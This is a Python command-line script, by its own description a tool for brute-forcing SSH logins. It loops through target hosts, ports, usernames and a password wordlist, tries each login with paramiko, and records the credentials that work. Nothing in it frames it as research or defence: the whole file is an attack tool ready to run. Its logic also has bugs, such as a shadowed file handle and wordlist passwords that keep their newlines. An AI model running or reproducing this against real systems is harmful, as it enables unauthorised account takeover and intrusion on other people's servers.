#!/usr/bin/env python3
import socket
import base64
import paramiko
import argparse
import re
import time

parser = argparse.ArgumentParser(description="Python program for brute forcing SSH")

parser.add_argument('--host', help='host(s) to scan', nargs='+', metavar='HOST')
parser.add_argument('-p', '--port', help='port(s) to scan', nargs='+', metavar='PORT')
parser.add_argument('--scanfile', help='use hosts from ssh-scan.py output file', nargs='+', metavar='FILE')
parser.add_argument('-o', '--outfile', help='output file to write successes to', nargs='+', metavar='FILE')
parser.add_argument('-w', '--wordlist', help='password wordlist to use', metavar='FILE')
parser.add_argument('--username', help='usernames to try', nargs='+', metavar='USER')
parser.add_argument('--password', help='passwords to try', nargs='+', metavar='PASS')
parser.add_argument('--debug', help='print error messages', action='store_true')
parser.add_argument('-q', '--quiet', help='suppress all output', action='store_true')

args = parser.parse_args()


def parse_scanfile(scanfiles, hosts, ports):
    for file in scanfiles:
        with open(file) as f:
            for line in f:
                linesplit = line.split()
                host_and_port = linesplit[0]
                extrasplit = host_and_port.split(":")
                host = extrasplit[0]
                port = extrasplit[1]
                hosts.append(host)
                ports.append(port)


def ssh_login(client, username, password, server, port, file_write):
    try:
        conn = client.connect(server, port=port, username=username, password=password)
        if conn is None:
            print('Success!')
            if file_write == 'True':
                f.write(server + ':' + str(port) + ' ' + password)
            if not args.quiet:
                print(server + ':' + str(port) + ' ' + password)
        client.close()
    except paramiko.ssh_exception.AuthenticationException:
        client.close()
        pass


if __name__ == '__main__':
    hosts = []
    ports = []
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    if args.outfile:
        outfile = args.outfile
        global f
        f = open(outfile, "a+")
        file_write = 'True'
    ## If scanfile argument not used, then use port and host argument
    try:
        if not args.scanfile:
            if args.host:
                for host in args.host:
                    hosts.append(host)
            if not args.port:
                ports.append(22)
            else:
                for port in args.port:
                    ports.append(port)
            if args.wordlist:
                with open(args.wordlist) as f:
                    for line in f:
                        password = line
                        for user in args.username:
                            username = user
                            for server in hosts:
                                for port in ports:
                                    print('Username: ' + username)
                                    print('Password: ' + password)
                                    try: 
                                        ssh_login(client, username, password, server, port, args.outfile)
                                    except paramiko.ssh_exception.SSHException:
                                        time.sleep(2)
            else:
                for password in args.password:
                    for user in args.username:
                        username = user
                        for server in hosts:
                            for port in ports:
                                try:
                                    ssh_login(client, username, password, server, port, args.outfile)
                                except paramiko.ssh_exception.SSHException:
                                    time.sleep(2)

    ## If scanfile argument used, do not use port and host argument
        if args.scanfile:
            parse_scanfile(args.scanfile, hosts, ports)
            if args.wordlist:
                with open(args.wordlist) as f:
                    for line in f:
                        password = line
                        for user in args.username:
                            username = user
                            for server in hosts:
                                for port in ports:
                                    try:
                                        ssh_login(client, username, password, server, port, args.outfile)
                                    except paramiko.ssh_exception.SSHException:
                                        time.sleep(2)
            else:
                for password in args.password:
                    for user in args.username:
                        username = user
                        for server in hosts:
                            for port in ports:
                                try:
                                    ssh_login(client, username, password, server, port, args.outfile)
                                except paramiko.ssh_exception.SSHException:
                                    time.sleep(2)
    except paramiko.ssh_exception.BadAuthenticationType:
        pass
